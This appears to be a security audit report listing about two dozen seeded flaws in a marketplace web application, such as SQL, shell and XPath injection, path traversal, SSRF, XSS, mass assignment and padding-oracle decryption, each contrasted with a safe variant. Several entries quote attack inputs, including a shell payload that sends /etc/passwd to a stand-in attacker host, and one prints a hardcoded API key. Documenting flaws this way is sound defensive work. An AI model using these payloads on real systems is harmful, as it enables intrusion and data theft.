extra.message: SQL injection: body.keyword and body.vendorId (user-controlled, up to 200 chars) are interpolated directly into a raw SQL string passed to prisma.$queryRawUnsafe. An authenticated support agent/admin can inject arbitrary SQL (e.g. keyword='%' OR 1=1 --) to read/modify any Dispute rows. The paired handler searchDisputeCaseFile shows the safe parameterized form.

Arbitrary code injection via new Function: body.formula (attacker-supplied JSON string) is wrapped as 'return ' + formula and compiled into a JavaScript function. A vendor_manager can execute arbitrary JS on the server (process/fetch/require globals are in scope), e.g. formula = "process.env" or a fetch-exfiltration payload, leading to RCE/information disclosure. Route POST /api/vendors/:id/payout-adjustment/preview.

OS command injection: runReportEngineViaPreset builds 'node ... --preset=' + preset into a single string and executes it with spawn(..., { shell: true }). preset flows from the request body (renderVendorLedgerReport called by POST /api/vendors/:id/ledger-report). A vendor can break out of the option value (e.g. preset = 'summary; curl attacker/$(cat /etc/passwd)') to run arbitrary shell commands. The safe counterpart renderOrderPackingReport uses an argv array without a shell and an allowlist.

OS command injection: convertCatalogExportDocument interpolates the user-controlled format value into an execSync shell command without allowlisting. Route POST /api/vendors/:id/catalog-export/convert passes body.format directly here; format like 'pdf; curl ...' executes arbitrary commands as the server. The safe variant convertCatalogExportDocumentSafe restricts format to an allowlist and uses spawnSync without a shell.

Path traversal (arbitrary file read): getVendorAgreementTemplate joins the URL parameter templateName directly onto agreementTemplateDir with path.join and reads it, with no containment check or basename sanitization (unlike the sibling getVendorPolicyTemplate which validates the resolved path stays under the template dir). A vendor_manager hitting GET /api/vendors/:id/agreements/..%2F..%2F..%2Fetc%2Fpasswd can read arbitrary server files.

Path traversal (arbitrary file read): getVendorComplianceArchiveEntry reads path.join(complianceArchiveDir, fileName) using the raw URL parameter fileName with no basename/containment check, allowing any authenticated vendor to read arbitrary files (e.g. /etc/passwd). The '-safe' variant getVendorComplianceArchiveEntrySafe applies path.basename, confirming this is a defect.

Missing authentication/authorization: POST /api/disputes/:id/carrier-exception-resolution is registered with NO auth middleware and calls applyCarrierExceptionResolution (src/server/carrierExceptionSignal.ts:24-39), which trusts attacker-controlled headers (x-carrier-confidence-tier, x-carrier-auto-resolve, x-carrier-confidence-score) and body.minConfidence. An unauthenticated attacker can set tier=trusted-partner, x-carrier-auto-resolve=true and a low minConfidence to auto-resolve any dispute. Compare the review route at line 1343 which requires auth and a transition check.

cwe: CWE-306: Missing Authentication for Critical Function

extra.message: Mass-assignment privilege escalation: applyBuyerAccountUpdate merges the entire untrusted request body into the user row (data = { ...current, ...req.body }) and only strips id, passwordHash, createdAt, updatedAt. A buyer can therefore PATCH /api/account/profile with { role: 'marketplace_admin', disabled: false, vendorId: ... , email: ... } and escalate to full admin / take over another identity. The validated counterpart applyBuyerAccountUpdateScoped only allows name/phone.

Server-Side Request Forgery: syncVendorCatalogDataSource fetches a fully attacker-controlled URL supplied via the x-catalog-source-url header (falling back to req.body.sourceUrl) and returns the first 2000 chars of the response. A vendor can target internal metadata endpoints (http://169.254.169.254/...), localhost services, etc. The '-scoped' variant restricts the hostname to an allowlist.

Local file disclosure via XML/DTD external entity: readDeclaredEntities parses '<!ENTITY name SYSTEM "path">' from the x-import-preferences header and calls fs.readFileSync(path) on that attacker-controlled path, then reflects the file contents back in the parsed <field> values returned by POST /api/imports/products/preferences. A vendor can read arbitrary server files. resolveImportPreferencesSafely rejects any DOCTYPE, confirming this is the unsafe path.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: Open redirect: resolveStorefrontReturnDestination redirects (res.redirect) to an unvalidated destination taken from the x-return-to header or the back query parameter (defaults to '/store'). An attacker can craft a link to /api/store/:handle/return-destination?back=https://evil.example to redirect victims (phishing). The '-safe' variant resolves only allow-listed paths.

cwe: CWE-601: URL Redirection to Untrusted Site

extra.message: Reflected/stored XSS: renderStorefrontBanner interpolates the vm_referral cookie value directly into an HTML response (content-type text/html) with no escaping. Because helmet runs with contentSecurityPolicy disabled (line 54), an attacker who can set the cookie value (e.g. vm_referral='"><script>...') achieves script execution in the victim's browser. The sibling renderStorefrontReceipt properly uses escapeHtml, confirming the missing sanitization.

Reflected XSS in script context: renderProductQuickViewScript concatenates the x-quickview-label header (and product.id) directly into an inline <script> block served as text/html, without JSON.stringify or HTML escaping. A value containing '</script><script>alert(1)</script>' terminates the script element and executes attacker JS when a browser navigates to the endpoint.

HTTP response header injection: exportDisputeEvidenceBundle places the attacker-controlled query parameter export_name directly inside the Content-Disposition header value. A value containing CR/LF (e.g. %0d%0aSet-Cookie:...) injects arbitrary headers, enabling response splitting/cookie injection. The '-safe' variant strips CR/LF characters first.

cwe: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers

extra.message: XPath injection: lookupShipmentManifestEntry builds the expression '/manifest/shipment[@tenant=... and @code=...]' by directly concatenating the unescaped vm_tenant cookie and code query parameter. Injecting a value such as x' or '1'='1 into code (or tenant) alters the predicate logic (evaluatePredicate in shipmentManifests.ts splits on 'or') and bypasses the tenant/code filters to enumerate manifest entries. The later lookupVendorDocumentIndexEntry properly escapes with escapeXPathString.

LDAP filter injection: searchStaffDirectoryByPreference embeds the vm_directory_scope cookie value directly into an LDAP search filter '(uid=<value>)' with no escaping. A crafted value like '*' or '*)(uid=*' widens the filter and bypasses the intended single-handler lookup to enumerate directory records. The sibling escalation-contact handler escapes the value with escapeDirectoryFilterValue first.

Denial of service via unbounded loop: resendOrderConfirmationBatch converts the x-repeat-count header to a Number and loops that many times creating outbox DB rows with no upper bound. Any authenticated order participant can send a huge x-repeat-count (e.g. 1e9) to exhaust DB/CPU. The bounded variant resendOrderConfirmationBounded caps it at 5.

IDOR / object-injection access control bypass: searchOrderActivityFeed builds the Prisma where clause as { buyerId: req.user.id, ...req.body }. Spreading the raw body AFTER the buyerId lets a buyer override buyerId (and any other field) to read another buyer's orders (PII, addresses, totals). The validated variant searchOrderActivityFeedScoped parses an allow-listed schema and preserves the enforced buyerId.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: Missing function-level access control (IDOR): applyProductInventoryAdjustment lets any vendor_manager adjust the inventory of ANY vendor's product because it never checks canReadVendorScoped on the target product. A malicious vendor can deplete or inflate competitors' stock. The '-scoped' variant enforces the vendor check.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: Client-controlled authorization: applyStorefrontTaglineEdit only checks a client-supplied body field (accountType === 'vendor_owner') to authorize editing a storefront. Any authenticated user can simply send accountType: 'vendor_owner' and overwrite the description/tagline of any vendor store. The '-verified' variant correctly authorizes server-side via canReadVendorScoped.

Mass assignment: applyVendorProfileBulkUpdate merges the full request body over the vendor record (Object.assign({}, vendor, req.body)) and persists every remaining scalar column, including status, taxIdMasked, payoutDestinationMasked, payoutLastChangedAt, contactEmail and slug. A vendor_manager can flip their own vendor from suspended/rejected to active (bypassing moderation) and rewrite masked financial fields. The validated variant applyVendorProfileUpdateValidated limits updates to an allow-listed schema.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: Path traversal in cache filename: cachePackingSlipRender embeds the unvalidated x-slip-locale header into the file path ${order.publicId}-${locale}.txt without basename/normalization checks, then writes attacker-constrained file contents outside the intended cache directory (arbitrary text file write). The sibling cacheCatalogDigestRender sanitizes its header with path.basename.

Sensitive information disclosure: generateVendorRemittanceSummary returns error.stack verbatim in the 400 response body when the periodEnd query fails validation, exposing internal file paths and stack internals. The sibling generateVendorPerformanceSummary handles errors without leaking stack traces.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: Cleartext storage of sensitive data: intakeVendorVerificationDocument regex-extracts SSNs and bank account numbers from uploaded files and writes them in plaintext to the OutboxMessage.payload JSON. The '-secure' variant seals these values via sealVerificationField, indicating the raw SSN/account data should not be stored unencrypted.

cwe: CWE-312: Cleartext Storage of Sensitive Information

extra.message: Padding-oracle decrypt: openLegacyVerificationExtract decrypts attacker-supplied iv/ciphertext with unauthenticated AES-256-CBC. The route decodeLegacyVerificationExtract (app.ts:1708) returns a distinct error ('Legacy verification extract padding is invalid') when padding fails versus a generic error otherwise, giving an oracle to test plaintext padding and enabling chosen-ciphertext recovery. The modern openVerificationField uses authenticated AES-GCM.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: Unsigned-data trust (alg confusion): openSyndicationLink trusts feed-link payloads outright whenever the header alg is 'none' or anything other than HS256, skipping HMAC verification entirely. An attacker can forge a signed-looking feed link for any vendorId and consume GET /api/vendors/:id/catalog-feed/:link without knowing FEED_LINK_SECRET. The strict variant openSyndicationLinkStrict verifies the signature, confirming the fallback is the weakness.

cwe: CWE-345: Insufficient Verification of Data Authenticity

extra.message: Hardcoded credential: pricingBenchmark.ts embeds a fallback pricing-feed bearer API key (pfk_7c1a4e9d2b3f6081aa5c) directly in source, used to authenticate against the PRICING_FEED_URL. Hardcoded secrets are exposed in version control and should come only from environment/secret storage.
